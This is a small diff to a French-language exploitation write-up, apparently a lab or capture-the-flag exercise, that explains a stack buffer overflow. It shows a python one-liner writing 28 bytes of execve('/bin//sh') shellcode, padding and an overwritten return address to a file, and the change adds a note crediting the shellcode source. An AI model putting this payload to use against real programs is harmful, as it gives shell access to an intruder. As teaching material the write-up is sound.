@@ -426,6 +426,6 @@ On forge une suite d'octets arbitaire:
 
 	python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (0x50 - 28) + "\xBF\x84\x04\x08"' > /tmp/file && ls -l /tmp/file
 
-> * `(0x50 - 28)` car il faut injecter 0x50 carcatères.
+> * `(0x50 - 28)` car il faut injecter 0x50 carcatères. Et le code du [shell](http://shell-storm.org/shellcode/files/shellcode-811.php) fait 28 octets.
 > * On fait une pierre deux coups. L'appel à `call EAX` est injecté via écrasement causé par un débordement de buffer `buffer` (`0x50` caractères).
 
